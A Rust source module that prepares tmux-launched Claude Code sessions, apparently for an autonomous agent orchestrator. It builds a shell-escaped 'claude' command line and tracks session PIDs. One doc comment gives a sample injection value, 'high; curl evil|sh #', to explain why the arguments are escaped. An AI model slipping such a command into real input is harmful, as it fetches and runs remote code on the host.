//! Session launch machinery for the tmux lane.
//!
//! Prepares everything a session needs before tmux starts it (capsule,
//! session settings, wrapper script, build cache), tracks the PID of the
//! process the wrapper `exec`s into, and guards PID-based liveness and
//! termination.

mod build_cache;
mod capsule;
mod pid_guard;
mod pid_tracking;
mod pid_wait;
mod prepare;
mod session_log;
pub(crate) mod session_settings;
mod wrapper;

#[cfg(test)]
#[path = "tests_capsule_probe.rs"]
mod tests_capsule_probe;

use shell_escape::escape;
use std::borrow::Cow;

use crate::models::session::Session;
use crate::remote_control::RemoteControlInvocation;

// The only build-cache piece callers outside this module need — `loom doctor` and `loom run`'s
// preflight report it. Resolution stays internal; `wrapper.rs` reaches it via `super::build_cache::`.
pub(crate) use build_cache::sccache_status_line;
// Re-exported so `super::session_capsule(...)` resolves from `prepare`.
pub(crate) use capsule::{session_capsule, SessionCapsule};
/// A test's stand-in for the daemon binary that `prepare::host::host_facts`
/// hands to `accepted_loom_bin`, taking precedence over the recorded daemon
/// binary. A unit test binary built under `/tmp` lies under a
/// session-writable root the preflight refuses, so a test that must get past
/// the preflight points this at a binary in a trusted root. Set only from
/// `#[serial]` tests, which restore it to `None`.
#[cfg(test)]
pub(crate) static TEST_LOOM_BIN: std::sync::Mutex<Option<std::path::PathBuf>> =
    std::sync::Mutex::new(None);
pub(crate) use pid_guard::{
    pid_only_is_alive, pid_only_terminate, session_process_status, SessionProcessStatus,
};
pub use pid_tracking::{cleanup_stage_files, read_pid_entry, wrapper_script_path};
pub(crate) use pid_wait::await_session_pid;
pub(crate) use prepare::{prepare_session_launch, record_daemon_binary, run_host_facts};
pub use session_log::stderr_log_path;
// Called from `orchestrator::core::judge_close` on judge close.
pub(crate) use session_settings::cleanup_session_settings;
// Lets callers elsewhere in the crate locate a session's generated settings capsule without
// duplicating its naming convention: retirement sweeps for it (`core/inbox_drain/sweep.rs`),
// and tests locate it the same way (see `core/event_handler/stalled_judge_tests.rs`).
pub(crate) use session_settings::session_settings_path;
pub use wrapper::create_wrapper_script;

/// Build the `claude` invocation string the tmux spawn runs.
///
/// Produces `"{claude_path} --model {model} --effort {effort} --permission-mode
/// {permission_mode} {escaped_prompt}[ --remote-control[=name]]"`.
///
/// `--permission-mode` is passed on the CLI rather than left to
/// `permissions.defaultMode` in the worktree's `settings.local.json`, because
/// Claude Code v2.1.142+ deliberately IGNORES `defaultMode: "auto"` from
/// project/local settings files (a repo must not be able to grant itself auto
/// mode). Only the `--permission-mode` startup flag (or user/managed settings)
/// is honored, so loom stages configured for `auto` would otherwise silently
/// fall back to `default` and prompt for every action — defeating autonomous
/// execution. The value is the camelCase spelling Claude Code's
/// `--permission-mode` flag accepts (`auto`, `acceptEdits`, `plan`, `default`).
///
/// The `--remote-control` flag is emitted per `remote_control`:
/// [`RemoteControlInvocation::Disabled`] omits it entirely (`claude
/// --remote-control` exits non-zero when its prerequisites are unmet, so it
/// must never be passed unconditionally), [`RemoteControlInvocation::Bare`]
/// passes the flag with no argument, and [`RemoteControlInvocation::Named`]
/// passes `--remote-control=<name>`. `Bare` exists because older claude
/// versions accept the flag but not its optional name argument; the two are
/// told apart by the `--help` probe in `remote_control.rs`
/// ([`crate::remote_control::resolve_invocation`] via
/// `cached_named_arg_supported`).
///
/// The `Named` value is joined with `=` rather than a space. `--remote-control
/// [name]` takes an *optional* argument: a space-separated value beginning
/// with `-` risks being reparsed as the NEXT option rather than consumed as
/// the name (`shell_escape` does not protect against this — a leading `-` is
/// not a shell metacharacter, so it is passed through unquoted). The `=` form
/// binds the value unambiguously regardless of its first character.
///
/// The flag MUST still come after the positional prompt: placed before it,
/// the arg parser can swallow the prompt as the RC session name (for `Bare`,
/// a following non-flag token is exactly what the optional-argument parser
/// would otherwise consume) and claude starts with no initial prompt (the
/// session sits idle / "stuck").
///
/// `claude_path`, `model`, `effort`, `permission_mode`, and the `Named`
/// session name are passed RAW and shell-escaped here. This is a
/// command-construction trust boundary: model strings containing shell
/// metacharacters would otherwise be glob-expanded by the shell, and a
/// tampered effort such as `high; curl evil|sh #` would be command injection.
/// The `Named` value carries the same exposure — it is derived from a stage
/// name that originates in plan YAML — so it is escaped alongside them (the
/// `=` join additionally closes the leading-`-` flag-reparsing risk noted
/// above, which shell-escaping alone does not).
/// `escaped_prompt` is pre-escaped by the caller (it is built from a trusted
/// signal path).
pub(crate) fn build_claude_command(
    claude_path: &str,
    model: &str,
    effort: &str,
    permission_mode: &str,
    capsule: &SessionCapsule,
    remote_control: &RemoteControlInvocation,
    escaped_prompt: &str,
) -> String {
    let claude_path = escape(Cow::Borrowed(claude_path));
    let model = escape(Cow::Borrowed(model));
    let effort = escape(Cow::Borrowed(effort));
    let permission_mode = escape(Cow::Borrowed(permission_mode));
    let mut capsule_flags = String::new();
    if let Some(path) = &capsule.settings_path {
        capsule_flags.push_str(&format!(
            " --settings {}",
            escape(Cow::Borrowed(path.as_str()))
        ));
    }
    if let Some(sources) = &capsule.setting_sources {
        capsule_flags.push_str(&format!(
            " --setting-sources {}",
            escape(Cow::Borrowed(sources.as_str()))
        ));
    }
    if capsule.strict_mcp_config {
        capsule_flags.push_str(" --strict-mcp-config");
    }
    if let Some(path) = &capsule.append_system_prompt_file {
        capsule_flags.push_str(&format!(
            " --append-system-prompt-file {}",
            escape(Cow::Borrowed(path.as_str()))
        ));
    }
    let remote_control_flag = match remote_control {
        RemoteControlInvocation::Disabled => String::new(),
        RemoteControlInvocation::Bare => " --remote-control".to_string(),
        RemoteControlInvocation::Named(name) => {
            format!(" --remote-control={}", escape(Cow::Borrowed(name.as_str())))
        }
    };
    format!(
        "{claude_path} --model {model} --effort {effort} --permission-mode {permission_mode}{capsule_flags} {escaped_prompt}{remote_control_flag}"
    )
}

/// Return the session's tracking key and its per-session PID-file key.
///
/// The tracking key is `session.tracking_key`, else `loom-<stage_id>`; the PID
/// key is `<tracking_key>-<session.id>`. Returns `None` for a session with
/// neither a tracking key nor a stage id.
pub(crate) fn tracking_and_pid_key(session: &Session) -> Option<(String, String)> {
    let tracking_key = if !session.tracking_key.is_empty() {
        session.tracking_key.clone()
    } else {
        format!("loom-{}", session.stage_id.as_ref()?)
    };
    let pid_key = format!("{}-{}", tracking_key, session.id);
    Some((tracking_key, pid_key))
}

#[cfg(test)]
mod tests;
#[cfg(test)]
mod tests_capsule;
#[cfg(test)]
mod tests_session_settings;
#[cfg(test)]
mod tests_wrapper_env;
// Sibling test modules across the crate reach this helper as
// `launch::write_test_pid_identity`.
#[cfg(test)]
pub(crate) use tests::write_test_pid_identity;
